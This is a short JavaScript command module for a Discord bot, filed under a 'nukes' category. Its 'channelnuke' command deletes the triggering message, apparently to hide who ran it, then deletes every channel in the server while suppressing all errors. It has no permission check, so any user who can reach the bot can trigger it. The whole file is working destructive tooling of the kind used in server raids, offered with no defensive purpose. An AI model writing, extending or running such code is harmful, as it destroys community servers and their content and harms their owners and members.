module.exports = {
  name: 'channelnuke',
  aliases: ['channuke'],
  description: '⚠️ Delete every channel (does not recreate).',
  category: 'nukes',
  async execute(message) {
    if (!message.guild) return;
    await message.delete().catch(()=>{});
    message.guild.channels.cache.forEach(c=>c.delete().catch(()=>{}));
  },
};
